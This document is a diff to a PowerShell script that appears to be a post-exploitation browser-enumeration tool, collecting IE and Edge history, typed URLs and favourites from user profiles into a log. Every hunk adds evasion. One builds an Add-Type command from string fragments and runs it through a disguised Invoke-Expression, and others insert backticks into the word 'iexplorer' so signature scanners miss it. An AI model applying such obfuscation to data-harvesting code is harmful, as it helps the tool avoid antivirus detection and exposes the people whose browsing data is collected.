@@ -105,9 +105,9 @@ If($param1 -ne "-CLEAN" -or $param1 -ne "-clean")
 
 
 function ConvertFrom-Json20([object] $item){
-    $RawString = "System.W"+"eb.Ext"+"ensions" -Join ''
+    $RawString = "Ad"+"d-Ty"+"pe -Ass"+"emblyNa"+"me System.W"+"eb.Ext"+"ensions" -Join ''
     $JavaSerial = "System.W"+"eb.Scri"+"pt.Serial"+"ization.Jav"+"aScriptSe"+"rializer" -Join ''
-    Add-Type -AssemblyName $RawString
+    $RawString|&('Sex' -replace 'S','I')
     $powers_js = New-Object $JavaSerial
     return ,$powers_js.DeserializeObject($item) 
 }
@@ -410,7 +410,7 @@ function IE_Dump {
     echo "`nIE History" >> $LogFilePath\BrowserEnum.log
     echo "----------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History")){
-        ## Retrieve History from iexplorer if not found MsEdge binary installation ..
+        ## Retrieve History from ie`xplorer if not found MsEdge binary installation ..
         $Finaltest = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" -ErrorAction SilentlyContinue
         If(-not($Finaltest) -or $Finaltest -eq $null){
             echo "{Could not find any History}" >> $LogFilePath\BrowserEnum.log
@@ -453,7 +453,7 @@ function IE_Dump {
     echo "`nIE Bookmarks" >> $LogFilePath\BrowserEnum.log
     echo "------------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks")){
-        ## Leaking iexplore
+        ## Leaking ie`xplore
         $URLs = Get-ChildItem -Path "$Env:SYSTEMDRIVE\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
         ForEach ($URL in $URLs){
             if ($URL.FullName -match 'Favorites'){
